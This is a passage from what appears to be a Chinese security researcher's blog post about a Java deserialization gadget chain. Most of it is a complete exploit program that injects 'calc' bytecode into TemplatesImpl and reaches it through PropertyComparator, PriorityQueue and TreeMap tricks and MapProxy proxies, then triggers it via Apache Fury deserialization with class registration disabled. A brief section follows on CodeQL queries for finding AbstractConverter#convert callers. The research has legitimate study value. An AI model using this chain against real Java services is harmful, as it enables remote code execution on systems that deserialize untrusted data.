+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">cn.hutool.core.map.BiMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">cn.hutool.core.map.MapProxy</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">cn.hutool.core.util.ReflectUtil</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">cn.hutool.core.util.SerializeUtil</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.feilong.core.util.comparator.PropertyComparator</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.feilong.lib.collection4.iterators.FilterIterator</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.feilong.lib.digester3.ObjectCreationFactory</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.google.common.collect.ArrayListMultimap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.google.common.collect.Multimap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.fury.Fury</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.fury.config.Language</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.fury.serializer.JavaSerializer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.invoke.SerializedLambda</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationTargetException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.PriorityQueue</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.TreeMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.google.common.base.Predicate</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">compare_test</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFieldValue</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">fieldName</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">declaredField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">fieldName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">().</span><span class="na">get</span><span class="p">(</span><span class="n">calc</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">()).</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">tmpl</span><span class="w">      </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">bytecodes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">bytecodes</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">bytecodes</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">tmpl</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">bytes</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;_name&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">name</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">name</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">tmpl</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;hello&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">tmpl1</span><span class="w">      </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w">    </span><span class="n">bytecodes1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">bytecodes1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">bytecodes1</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">tmpl1</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">bytes</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">name1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;_name&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">name1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">name1</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">tmpl1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;hello2&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">///templates</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        String prop = &#34;digester&#34;;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">prop</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;digester&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PropertyComparator</span><span class="w"> </span><span class="n">propertyComparator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PropertyComparator</span><span class="p">(</span><span class="n">prop</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">TreeMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TreeMap</span><span class="p">(</span><span class="n">propertyComparator</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">templatesImpl1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tmpl1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">templatesImpl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tmpl</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PropertyComparator</span><span class="w"> </span><span class="n">propertyComparator1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PropertyComparator</span><span class="p">(</span><span class="s">&#34;outputProperties&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">priorityQueue1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">(</span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="n">propertyComparator1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ReflectUtil</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">priorityQueue1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;size&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">objectsjdk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">templatesImpl1</span><span class="p">,</span><span class="w"> </span><span class="n">templatesImpl</span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">priorityQueue1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;queue&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">objectsjdk</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">/////jdk</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SerializeUtil</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">priorityQueue1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">hashmap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashmap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">prop</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">MapProxy</span><span class="w"> </span><span class="n">mapProxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MapProxy</span><span class="p">(</span><span class="n">hashmap</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectCreationFactory</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ObjectCreationFactory</span><span class="p">)</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">ObjectCreationFactory</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">ObjectCreationFactory</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="n">mapProxy</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectCreationFactory</span><span class="w">  </span><span class="n">test1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ObjectCreationFactory</span><span class="p">)</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">ObjectCreationFactory</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">ObjectCreationFactory</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="n">mapProxy</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TreeMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">test</span><span class="p">,</span><span class="n">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        TreeMap.put(test1,2);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        setFieldValue(TreeMap,&#34;comparator&#34;, propertyComparator);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        TreeMap.put(1234,123);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        TreeMap.put(1234,123);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        root = new TreeMap.Entry&lt;&gt;(&#34;key&#34;, &#34;value&#34;, null);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">declaredConstructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.util.TreeMap$Entry&#34;</span><span class="p">).</span><span class="na">getDeclaredConstructors</span><span class="p">()</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredConstructor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">root_test1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">declaredConstructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="w"> </span><span class="n">test1</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TreeMap</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;root&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">root</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">Troot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">TreeMap</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">left</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Troot</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;right&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">left</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">left</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">Troot</span><span class="p">,</span><span class="w"> </span><span class="n">root_test1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">root</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">TreeMap</span><span class="p">,</span><span class="w"> </span><span class="n">Troot</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">TreeMap</span><span class="p">,</span><span class="s">&#34;size&#34;</span><span class="p">,</span><span class="n">2</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">TreeMap</span><span class="p">,</span><span class="s">&#34;modCount&#34;</span><span class="p">,</span><span class="n">2</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        TreeMap.put(test1,1232);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        BiMap hashMap = new BiMap(hashMap1);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Fury</span><span class="w"> </span><span class="n">fury</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Fury</span><span class="p">.</span><span class="na">builder</span><span class="p">().</span><span class="na">withLanguage</span><span class="p">(</span><span class="n">Language</span><span class="p">.</span><span class="na">JAVA</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">.</span><span class="na">requireClassRegistration</span><span class="p">(</span><span class="kc">false</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">.</span><span class="na">build</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">serialize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fury</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">TreeMap</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">deserialize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fury</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="n">serialize</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>差不多就先这样吧</p>
+<p>其实我ql最初路走偏了，然后我就像通过call这种向上找（convert那个点），为什么不用tabby呢（我找出来很不全），</p>
+<p>然后我就去找<code>AbstractConverter#convert</code>会有哪些调用到，但是始终找不全，idea是有16个，tabby8个，ql始终是只有13个。然后去看ql是什么原因导致的。发现有个点位应该被找到的但是结果里面没有（见下图），<code>DateConverter.convert</code>这个点和下面<code>TemporalAccessorConverter</code>这个条件肯定是一样的。DateConverter是继承<code>AbstractConverter&lt;Date&gt;</code>是符合的，不知道为什么找不到，然后找了对应的类<code>NumberWithFormat</code>所有的caller点，也是没<code>DateConverter.convert</code>（感觉是数据库生成<code>节点</code>的问题啊，有大哥懂的，解答下小弟）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">import</span><span class="w"> </span><span class="n">java</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">from</span><span class="w"> </span><span class="n">RefType</span><span class="w"> </span><span class="n">abstractConverter</span><span class="p">,</span><span class="w"> </span><span class="n">RefType</span><span class="w"> </span><span class="n">subclass</span><span class="p">,</span><span class="k">Method</span><span class="w"> </span><span class="n">m</span><span class="p">,</span><span class="n">MethodCall</span><span class="w"> </span><span class="n">mcall</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">where</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">(</span><span class="n">abstractConverter</span><span class="p">.</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;cn.hutool.core.convert.Converter&lt;%&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">abstractConverter</span><span class="p">.</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;cn.hutool.core.convert.Converter&#34;</span><span class="p">)</span><span class="w">  </span><span class="p">)</span><span class="k">and</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">subclass</span><span class="p">.</span><span class="n">getASupertype</span><span class="o">*</span><span class="p">()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">abstractConverter</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">and</span><span class="w"> </span><span class="n">m</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">()</span><span class="o">=</span><span class="n">subclass</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">and</span><span class="w"> </span><span class="n">m</span><span class="p">.</span><span class="n">hasName</span><span class="p">(</span><span class="s2">&#34;convert&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">and</span><span class="w"> </span><span class="n">mcall</span><span class="p">.</span><span class="n">getMethod</span><span class="p">()</span><span class="o">=</span><span class="n">m</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;cn.hutool.core.convert.Converter%&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">m</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;cn.hutool.core.convert.AbstractConverter%&#34;</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">m</span><span class="p">,</span><span class="n">m</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">(),</span><span class="n">mcall</span><span class="p">,</span><span class="n">mcall</span><span class="p">.</span><span class="n">getEnclosingCallable</span><span class="p">().</span><span class="n">getDeclaringType</span><span class="p">()</span><span class="w">
+</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20250427175601606.png" alt="image-20250427175601606"  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/chain/jdk7u218u20-%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>jdk7u21&amp; 8u20 深度分析</span>
+  </a>
+  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>Fastjson原生链</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
